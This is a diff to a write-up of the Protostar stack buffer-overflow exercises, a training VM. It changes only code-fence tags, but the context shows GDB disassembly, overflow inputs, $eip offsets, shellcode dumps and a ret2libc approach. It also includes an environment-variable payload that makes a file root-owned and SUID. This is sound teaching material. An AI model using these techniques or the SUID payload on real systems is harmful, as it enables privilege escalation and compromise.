@@ -92,7 +92,7 @@ interesting.
 The first interesting line is the fifth line. This line moves the value `0x0`
 to the memory address `$esp + 0x5c`.
 
-```
+```shell
 0x080483fd <main+9>:    movl   $0x0,0x5c(%esp)
 ```
 
@@ -100,7 +100,7 @@ This is probably the `modified` variable especially since that memory
 address is checked at a later point to see if it's set to 0 using the common
 `test $eax, $eax` idiom.
 
-```
+```shell
 0x08048411 <main+29>:   mov    0x5c(%esp),%eax
 0x08048415 <main+33>:   test   %eax,%eax
 0x08048417 <main+35>:   je     0x8048427 <main+51>
@@ -109,7 +109,7 @@ address is checked at a later point to see if it's set to 0 using the common
 The next few lines tells us that the `buffer` array starts at the memory
 address `$esp + 0x1c`.
 
-```
+```shell
 0x08048405 <main+17>:   lea    0x1c(%esp),%eax
 0x08048409 <main+21>:   mov    %eax,(%esp)
 0x0804840c <main+24>:   call   0x804830c <gets@plt>
@@ -268,7 +268,7 @@ Our goal here is to execute the `win()` function.
 
 We open up the `stack3` binary in GDB.
 
-```
+```shell
 (gdb) disass main
 Dump of assembler code for function main:
 0x08048438 <main+0>:    push   %ebp
@@ -299,7 +299,7 @@ at `$esp + 0x1c`
 
 The interesting bit in this program is the following two lines:
 
-```
+```shell
 0x08048471 <main+57>:   mov    0x5c(%esp),%eax
 0x08048475 <main+61>:   call   *%eax
 ```
@@ -310,7 +310,7 @@ have completed this stage.
 
 In the disassembly of `win()`, we see that the function starts at `0x08048424`.
 
-```
+```shell
 (gdb) disass win
 Dump of assembler code for function win:
 0x08048424 <win+0>:     push   %ebp
@@ -358,7 +358,7 @@ Our goal here is to execute the `win()` function by gaining control of `$eip`.
 
 We open the `stack4` binary in GDB.
 
-```
+```shell
 (gdb) disass main
 Dump of assembler code for function main:
 0x08048408 <main+0>:    push   %ebp
@@ -388,7 +388,7 @@ located on the stack at `$ebp + 4`, and restore it to the `$eip` register. We
 can overwrite this memory location with the memory address we want `$eip` to be
 at after the `ret` instruction.
 
-```
+```shell
 (gdb) info reg
 eax            0xbffff740       -1073744064
 ecx            0xbffff740       -1073744064
@@ -414,7 +414,7 @@ We know that `buffer` starts at `$esp + 0x10`. This means that we need to write
 
 In the disassembly of `win()`, we see that the function starts at `0x080483f4`.
 
-```
+```shell
 (gdb) disass win
 Dump of assembler code for function win:
 0x080483f4 <win+0>:     push   %ebp
@@ -466,7 +466,7 @@ A normal `execve /bin/sh` shell code will simply exit after running `/bin/sh`.
 
 We open up the `stack5` binary in GDB.
 
-```
+```shell
 (gdb) disass main
 Dump of assembler code for function main:
 0x080483c4 <main+0>:    push   %ebp
@@ -504,7 +504,7 @@ as the previous levels. Reusing the calculations from before, we know that
 `buffer` starts at `$esp + 0x10` and that we need to write 76 bytes + the
 4 bytes we want `$eip` to be at after the `ret` instruction.
 
-```
+```shell
 (gdb) run
 Starting program: /opt/protostar/bin/stack5
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
@@ -543,7 +543,7 @@ We see that the memory location we want to jump to is actually loaded into
 static location in the program's address space, we can point `$eip` to that
 location to execute our shellcode.
 
-```
+```shell
 0x080483cd <main+9>:    lea    0x10(%esp),%eax
 ```
 
@@ -569,7 +569,7 @@ Looking in GDB, we see that the last 11 bytes of our shellcode was overwritten
 during execution. This is a result of the `push` instructions in the shellcode
 writing values onto the stack.
 
-```
+```shell
 (gdb) x/20x 0xbffff740
 0xbffff740:     0xdb31c031      0x80cd06b0      0x742f6853      0x2f687974
 0xbffff750:     0x89766564      0x66c931e3      0xb02712b9      0x3180cd05
@@ -627,7 +627,7 @@ We see that while the code is very similar to the previous level, we are unable
 to overwrite `$eip` with an arbitrary address due to the `ret & 0xbf000000`
 check. We take a look at the disassembly of `getpath()` in GDB.
 
-```
+```shell
 (gdb) disass getpath
 Dump of assembler code for function getpath:
 0x08048484 <getpath+0>: push   %ebp
@@ -671,7 +671,7 @@ we want `$eip` to be at after the `ret` instruction. This makes sense because
 4 more bytes is allocated on the stack (compared to the previous level) to
 store the `unsigned int ret` variable.
 
-```
+```shell
 (gdb) run
 Starting program: /opt/protostar/bin/stack6
 input path please: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBB
@@ -687,7 +687,7 @@ from GDB that the stack is mapped to the memory between `0xbffeb000` and
 memory address on the stack. You can think of this as a crude implementation of
 a non-executable stack.
 
-```
+```shell
 (gdb) info proc map
 process 2715
 cmdline = '/opt/protostar/bin/stack6'
@@ -727,7 +727,7 @@ is usually the target as it is almost always linked and contains functions like
 
 With GDB, we can locate the location of the `system()` function.
 
-```
+```shell
 (gdb) print system
 $1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
 ```
@@ -735,7 +735,7 @@ $1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
 Next, we need to control the parameters of `system()`. The libc calling
 convention uses the stack to pass parameters. This is how the stack looks:
 
-```
+```shell
 [random stack data][$eip - address of system()][return address][address of parameter]
 ```
 
@@ -802,7 +802,7 @@ We set the environmental variable `SHELLME` to the shell command we want to
 execute. In this case, we will set the owner of `/home/user/shell` to root and
 give it the SUID bit.
 
-```
+```shell
 user@protostar:~$ export SHELLME="/bin/chown root:root /home/user/shell; /bin/chmod 4755 /home/user/shell"
 user@protostar:~$ ./getenv SHELLME /opt/protostar/bin/stack6
 SHELLME will be at 0xbfffff16
@@ -813,7 +813,7 @@ program will jump to after `system()` is done. While it has no bearing on
 successful exploitation, we can set it to the `exit()` function to exit
 cleanly.
 
-```
+```shell
 (gdb) print exit
 $1 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
 ```
@@ -868,7 +868,7 @@ This is similar to stack 6 except that the filter is even more restrictive.
 This time, the only location we can overwrite `$eip` is within the `stack7`
 binary itself.
 
-```
+```shell
 (gdb) info proc map
 process 4061
 cmdline = '/opt/protostar/bin/stack7'
@@ -895,7 +895,7 @@ Mapped address spaces:
 
 We take a look at the disassembly of `getpath()`.
 
-```
+```shell
 (gdb) disass getpath
 Dump of assembler code for function getpath:
 0x080484c4 <getpath+0>: push   %ebp
@@ -939,7 +939,7 @@ End of assembler dump.
 Similar to stack 6, `buffer` starts at `-0x4c(%ebp)` and we need to write 84
 bytes to overwrite `$eip`. We can confirm this in GDB.
 
-```
+```shell
 (gdb) run
 Starting program: /opt/protostar/bin/stack7
 input path please: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBB
